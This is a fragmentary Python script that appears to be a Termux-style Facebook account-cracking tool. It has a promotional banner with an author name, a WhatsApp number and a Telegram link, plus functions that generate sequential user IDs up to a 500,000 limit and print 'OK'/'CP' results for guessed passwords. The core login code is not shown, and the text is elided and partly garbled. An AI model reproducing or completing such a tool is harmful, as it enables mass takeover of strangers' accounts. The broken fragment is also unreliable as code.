...
\x1b[1;97m---------------------------------------------------
 ...
 鈹� [鉁揮 WHATSAPP : +8801316113328    
 鈹� [鉁揮 POWER BY : \x1b[1;32mAFRIDE\x1b[1;97m            
\033[1;92m_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_""")
        ...
        print("\033[97;1m=======================================================")
        print("\033[92;1m        ᗩUTHOR : OSᗩᗰᗩ-ZᗩMZᗩM      ")
        print("\033[97;1m=======================================================")
        ...
        if hoga in ["", " "]:
            ...
            os.system('am start https://t.me/+U45CNKnoqu45YmI0')
        else:
            Main()
    ...
    def fbtua(self):
        ...
        xx = 999999999
        idx = "100000"
        limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;97m(500000MAX): \033[0;92m"))
        if (limit) > 500000:
    ...
    def old4_6(self):
        ...
        limit = int(input("\033[092m [+] ENTER LIMIT \033[0;91m(500000 MAX): \033[0;92m"))
        if (limit) > 500000:
            exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)" % (R))
        try:
            for n in range(limit):
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write(
            "\r\r %s\033[0;93m[ OSᗩᗰᗩ-OK ] : \033[0;97m %s/%s -> \033[0;92m [ OK ]- \033[0;93m[CP ]" % (
